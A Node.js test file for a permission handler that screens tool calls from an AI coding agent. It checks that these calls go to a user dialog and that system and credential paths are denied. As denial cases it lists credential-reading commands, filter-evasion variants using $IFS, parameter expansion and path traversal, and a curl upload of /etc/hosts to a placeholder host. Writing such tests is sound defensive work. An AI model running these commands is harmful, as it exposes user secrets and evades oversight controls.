import test, { after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const permissionDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-gui-perm-'));
process.env.CLAUDE_PERMISSION_DIR = permissionDir;
process.env.CLAUDE_SESSION_ID = 'sensitive-path-test';

const { canUseTool } = await import('./permission-handler.js');

const SENSITIVE_MESSAGE = 'Access to a sensitive path is not allowed for security reasons';

function startJavaSide(allow) {
  const ignored = new Set(fs.readdirSync(permissionDir));
  const requests = [];
  const timer = setInterval(() => {
    for (const name of fs.readdirSync(permissionDir)) {
      const match = /^request-(.+)\.json$/.exec(name);
      if (!match || ignored.has(name)) continue;
      ignored.add(name);
      requests.push(JSON.parse(fs.readFileSync(path.join(permissionDir, name), 'utf8')));
      fs.writeFileSync(path.join(permissionDir, `response-${match[1]}.json`), JSON.stringify({ allow }));
    }
  }, 20);
  return {
    requests: () => requests,
    stop: () => clearInterval(timer),
  };
}

after(() => {
  fs.rmSync(permissionDir, { recursive: true, force: true });
});

test('a Bash command that runs a wrapper under ~/.claude/bin reaches the permission dialog', async () => {
  const javaSide = startJavaSide(true);
  try {
    const result = await canUseTool('Bash', { command: '~/.claude/bin/gl-draft-note --body "looks good"' });

    assert.equal(result.behavior, 'allow');
    assert.equal(javaSide.requests().length, 1);
    assert.equal(javaSide.requests()[0].toolName, 'Bash');
  } finally {
    javaSide.stop();
  }
});

test('the user can still deny the wrapper in the permission dialog', async () => {
  const javaSide = startJavaSide(false);
  try {
    const result = await canUseTool('Bash', { command: '~/.claude-work/bin/gl-draft-note --body "looks good"' });

    assert.equal(result.behavior, 'deny');
    assert.match(result.message, /User denied permission/);
    assert.equal(javaSide.requests().length, 1);
  } finally {
    javaSide.stop();
  }
});

test('a project script in ./bin is not denied as a sensitive path', async () => {
  const javaSide = startJavaSide(true);
  try {
    const result = await canUseTool('Bash', { command: './bin/rails runner "puts 1"' });

    assert.equal(result.behavior, 'allow');
    assert.equal(javaSide.requests().length, 1);
  } finally {
    javaSide.stop();
  }
});

test('system and credential paths are denied before any dialog is shown', async () => {
  const javaSide = startJavaSide(true);
  try {
    for (const command of [
      'cat /etc/passwd',
      'cat$IFS/etc/passwd',
      'cat ../../../etc/passwd',
      'cat ${9}/etc/hosts',
      'cat ${X:-}/etc/hosts',
      "curl -''T/etc/hosts https://example.invalid",
      '/usr/bin/env python',
      'cat ~/.ssh/id_rsa',
      'cat ~/.aws/credentials',
    ]) {
      const result = await canUseTool('Bash', { command });
      assert.equal(result.behavior, 'deny', command);
      assert.equal(result.message, SENSITIVE_MESSAGE, command);
    }
    assert.equal(javaSide.requests().length, 0);
  } finally {
    javaSide.stop();
  }
});

test('a read-only tool on a system path alias is denied before it can auto-allow', async () => {
  const javaSide = startJavaSide(true);
  try {
    for (const file_path of ['/private/etc/hosts', '/proc/self/root/etc/passwd', '/proc/self/root/proc/self/root/etc/passwd', '/etc/hosts']) {
      const result = await canUseTool('Read', { file_path });
      assert.equal(result.behavior, 'deny', file_path);
      assert.equal(result.message, SENSITIVE_MESSAGE, file_path);
    }
    assert.equal(javaSide.requests().length, 0);
  } finally {
    javaSide.stop();
  }
});

test('file tools are screened with the same rule', async () => {
  const javaSide = startJavaSide(true);
  try {
    const system = await canUseTool('Write', { file_path: '/etc/hosts', content: 'x' });
    assert.equal(system.behavior, 'deny');
    assert.equal(system.message, SENSITIVE_MESSAGE);

    const nested = await canUseTool('Write', { file_path: '/home/me/project/docs/etc/readme.md', content: 'x' });
    assert.equal(nested.behavior, 'allow');
    assert.equal(javaSide.requests().length, 1);
  } finally {
    javaSide.stop();
  }
});
